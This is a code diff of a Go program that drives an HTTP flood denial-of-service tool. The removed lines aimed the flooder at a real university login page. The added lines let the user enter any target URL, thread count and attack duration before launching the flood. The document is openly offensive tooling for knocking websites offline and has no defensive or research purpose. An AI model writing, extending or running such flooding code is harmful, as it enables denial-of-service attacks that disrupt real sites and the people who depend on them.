@@ -1,15 +1,31 @@
 package main
 
 import (
+	"bufio"
 	"facef/golang-httpflood/rodolfo-flood/DDOS-FLOOD/ddos"
 	"fmt"
+	"log"
+	"os"
+	"strconv"
+	"strings"
 )
 
 func main() {
 	printIntro()
 
-	x := ddos.NewFlooder("https://ava-grad.unifacef.com.br/login/index.php", 10, 10)
-	x.SetDuration(10)
+	url := strings.TrimSpace(getInput("Input URL"))
+
+	threads, err := strconv.Atoi((strings.TrimSpace(getInput("Input Thread Number"))))
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	attackDuration, err := strconv.Atoi(strings.TrimSpace(getInput("Input Attack Duration (seconds)")))
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	x := ddos.NewFlooder(url, uint16(threads), uint32(attackDuration))
 	x.Flood()
 }
 
@@ -26,4 +42,12 @@ func printIntro() {
 	fmt.Println(`| '--------------' || '--------------' || '--------------' |`)
 	fmt.Println(` '----------------'  '----------------'  '----------------' `)
 	fmt.Println("     Hello, My name is Rodolfo, and welcome to my DDOS!")
+	fmt.Println()
+}
+
+func getInput(prompt string) string {
+	fmt.Print(prompt + ": ")
+	reader := bufio.NewReader(os.Stdin)
+	input, _ := reader.ReadString('\n')
+	return input[:len(input)-1] // Remove the newline character
 }
